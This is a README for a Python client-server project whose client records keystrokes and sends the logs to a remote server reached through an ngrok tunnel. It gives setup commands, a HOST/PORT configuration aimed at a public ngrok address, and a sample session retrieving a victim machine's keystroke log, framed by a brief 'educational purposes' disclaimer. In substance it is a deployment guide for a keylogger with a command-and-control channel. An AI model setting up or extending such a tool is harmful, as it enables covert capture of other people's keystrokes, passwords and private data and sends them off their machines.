Remote Access Client-Server System
This project demonstrates a simple client-server architecture in Python for remote access, using TCP sockets to allow a server to send commands to connected clients. The client logs keystrokes and sends log data to the server upon request.

Features
Persistent client connections, with automatic retries if the server is unavailable.
Command-based interaction between the server and clients.
Log file storage on client machines.
Remote access enabled via Ngrok for ease of server deployment.

Prerequisites
Python 3.6+
Ngrok account (free or paid plan depending on requirements)
Setup Instructions

1. Clone the Repository
git clone https://github.com/your-username/remote-access-system.git
cd remote-access-system
2. Set Up a Python Virtual Environment

python3 -m venv myenv
source myenv/bin/activate  # On Windows use `myenv\Scripts\activate`
pip install -r requirements.txt

3. Ngrok Configuration
To make the server accessible over the internet, we’ll use Ngrok to create a secure tunnel.

Install Ngrok: Download and install Ngrok from the official website.
Start Ngrok: Run the following command to create a TCP tunnel on port 65432 (or your server's port):


ngrok tcp 65432
Copy the Ngrok Forwarding Address: Once Ngrok starts, it will display a forwarding address like x.tcp.ngrok.io:PORT. Use this address in client.py to replace the server IP and port.

Example Ngrok output:

Forwarding                    tcp://6.tcp.ngrok.io:13223 -> localhost:65432
Here, 6.tcp.ngrok.io is the hostname, and 13223 is the port.

4. Configure client.py
In client.py, update the HOST and PORT variables with your Ngrok forwarding address. For example:


HOST = "6.tcp.ngrok.io"  # Replace with your Ngrok hostname
PORT = 13223             # Replace with your Ngrok port
Usage
1. Start the Server
Run server.py on the host machine to start listening for client connections:


python server.py
The server will list active clients and provide options to send commands.
Enter 0 to refresh the list of connected clients, and use numbers to select clients for interaction.
2. Start the Client(s)
Run client.py on each client machine:


python client.py
The client will attempt to connect to the server and retry every 10 seconds if the server is not yet available.

3. Sending Commands to Clients
LOG: Requests the client’s log file, which contains keystrokes logged during the client session.
exit: Closes the connection with the selected client.
Example interaction:


Active Clients (Enter '0' to refresh):
1. ('127.0.0.1', 52152)

Select client by number or '0' to refresh: 1
Enter the command to send to the client (or 'exit' to stop): LOG
Security Disclaimer
This project is intended solely for educational purposes. Logging keystrokes without consent is unethical and may be illegal. Always obtain permission from users before deploying any monitoring or remote access tool.

License
This project is licensed under the MIT License.

With this setup, you can remotely interact with any client machine running client.py as long as it is connected to the internet. The Ngrok tunnel will facilitate the secure, remote connection between the client and the server.
